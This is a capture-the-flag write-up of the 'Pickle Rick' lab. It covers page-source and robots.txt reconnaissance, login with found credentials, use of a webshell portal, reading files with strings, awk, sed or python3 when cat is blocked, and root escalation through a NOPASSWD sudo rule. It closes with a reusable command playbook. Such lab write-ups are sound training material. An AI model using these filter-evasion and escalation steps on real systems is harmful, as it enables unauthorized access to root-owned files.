 Pickle Rick CTF Write‑Up

# Reconnaissance

 **View page source**:  
  ```bash
  # In browser: Right‑click → View Page Source
  ```
  - Found **Ingredient 1** hidden in HTML comments.  
  - Lesson: Always check source code for clues, comments, or encoded strings.

- **robots.txt**:  
  ```bash
  http://<target>/robots.txt
  ```
  - Revealed restricted paths.  
  - Lesson: Robots.txt often leaks sensitive directories.

- **login.php**:  
  - Weak credentials (`R1ckRul3s` / `Wubbalubbadubdub`).  
  - Lesson: Test obvious or hinted credentials first.



#  Portal Access
- Logged into the **webshell portal**.  
- Common commands (`cat`, `ls`) were blocked.  
- Lesson: Expect command restrictions in CTFs; pivot to alternatives.



#  Ingredient 1

- Found in page source.  
- Text: **“mr. meeseeks hair.”**




#  Ingredient 2

- File located at `/home/rick/second ingredients`.  
- Because of the space, escape it:

```bash
strings "/home/rick/second ingredients"
```
or
```bash
strings /home/rick/second\ ingredients
```

- Output: **“1 jerry tear.”**  
- Lesson: Learn to handle filenames with spaces and use alternative binaries (`strings`, `awk`, `sed`, `python3`) when `cat` is blocked.




#  Ingredient 3


- Check sudo permissions:
  ```bash
  sudo -l
  ```
  - Output: `www-data` may run `(ALL) NOPASSWD: ALL`.

- Escalate privileges:
  ```bash
  sudo su
  ```
  or directly:
  ```bash
  sudo whoami
  ```

- Read root file:
  ```bash
  sudo strings /root/3rd.txt
  ```
  - Output: **“A Rick’s flask of pickled rick juice.”**

- Lesson: Always check `sudo -l`. Misconfigured sudo rules are common privilege escalation paths.




#  Key Lessons Learned


- **Page source inspection**: Hidden clues often live in HTML comments.  
- **robots.txt enumeration**: Can reveal sensitive directories.  
- **Command restrictions**: Pivot to `strings`, `awk`, `sed`, or scripting languages when `cat`/`ls` are blocked.  
- **Filename handling**: Escape spaces with quotes or backslashes.  
- **Privilege escalation**: `sudo -l` is your best friend; misconfigurations often allow root access.  
- **Workflow polish**: Document each step — makes future CTFs faster and more reliable.


#  Reusable Command Playbook
- **Decode Base64 clues**:
  ```bash
  echo "<string>" | base64 -d
  ```
- **Read files without cat**:
  ```bash
  strings <file>
  awk '{print}' <file>
  sed -n 'p' <file>
  python3 -c 'print(open("<file>").read())'
  ```
- **Privilege escalation**:
  ```bash
  sudo -l
  sudo su
  sudo strings /root/3rd.txt
  ```
